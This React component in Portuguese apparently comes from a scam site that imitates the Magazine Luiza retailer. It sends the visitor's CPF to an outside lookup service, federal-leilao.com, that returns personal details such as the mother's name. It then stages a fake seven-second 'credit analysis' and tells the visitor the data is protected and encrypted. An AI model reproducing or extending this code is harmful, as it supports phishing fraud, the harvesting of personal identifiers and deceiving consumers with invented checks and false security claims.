import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { CartItem } from "@/types";
import { Loader2 } from "lucide-react";

/**
 * Página de Análise de Crédito
 * - Loading com mensagens animadas (7 segundos)
 * - Consulta API de CPF
 * - Redireciona para resultado
 */

interface CPFData {
  nome?: string;
  cpf?: string;
  data_nascimento?: string;
  sexo?: string;
  nome_mae?: string;
  [key: string]: unknown;
}

export default function CreditAnalysis() {
  const [, navigate] = useLocation();
  const [currentMessage, setCurrentMessage] = useState(0);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  const messages = [
    "Consultando dados...",
    "Analisando possibilidade de crédito...",
    "Verificando informações...",
    "Finalizando análise..."
  ];

  useEffect(() => {
    const cpf = localStorage.getItem("userCPF");
    const cartItem = localStorage.getItem("cartItem");

    if (!cpf || !cartItem) {
      navigate("/cpf");
      return;
    }

    // Limpar CPF para apenas números
    const cleanCPF = cpf.replace(/\D/g, "");

    // Alternar mensagens a cada 1.75 segundos (total 7 segundos para 4 mensagens)
    const messageInterval = setInterval(() => {
      setCurrentMessage((prev) => {
        if (prev < messages.length - 1) {
          return prev + 1;
        }
        return prev;
      });
    }, 1750);

    // Fazer requisição à API
    const fetchCPFData = async () => {
      try {
        const response = await fetch(
          `https://federal-leilao.com/v1/contratediscordrev0ltz/${cleanCPF}`
        );
        
        if (!response.ok) {
          throw new Error("Erro ao consultar dados");
        }

        const data: CPFData = await response.json();
        
        // Salvar dados no localStorage
        localStorage.setItem("cpfData", JSON.stringify(data));
        
        // Aguardar o tempo total de loading (7 segundos)
        setTimeout(() => {
          setIsLoading(false);
          navigate("/resultado");
        }, 7000);
      } catch (err) {
        console.error("Erro na API:", err);
        setError("Não foi possível consultar seus dados. Tente novamente.");
        setIsLoading(false);
      }
    };

    fetchCPFData();

    return () => {
      clearInterval(messageInterval);
    };
  }, [navigate]);

  if (error) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-[#0086FF] to-[#0066CC] flex items-center justify-center p-4">
        <div className="bg-white rounded-2xl p-6 max-w-sm w-full text-center">
          <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <span className="text-3xl">❌</span>
          </div>
          <h2 className="text-xl font-bold text-gray-800 mb-2">Ops!</h2>
          <p className="text-gray-600 mb-4">{error}</p>
          <button
            onClick={() => navigate("/cpf")}
            className="magalu-btn-green w-full py-3 rounded-lg font-bold"
          >
            Tentar novamente
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#0086FF] to-[#0066CC] flex items-center justify-center p-4">
      <div className="text-center text-white">
        {/* Spinner */}
        <div className="mb-8">
          <Loader2 className="w-16 h-16 animate-spin mx-auto" />
        </div>

        {/* Mensagem atual */}
        <h2 className="text-2xl font-bold mb-4 animate-pulse">
          {messages[currentMessage]}
        </h2>

        {/* Barra de progresso */}
        <div className="w-64 h-2 bg-white/30 rounded-full mx-auto overflow-hidden">
          <div 
            className="h-full bg-white rounded-full transition-all duration-1000"
            style={{ width: `${((currentMessage + 1) / messages.length) * 100}%` }}
          />
        </div>

        {/* Texto de segurança */}
        <p className="text-sm text-white/70 mt-6">
          Seus dados estão protegidos e criptografados
        </p>
      </div>
    </div>
  );
}
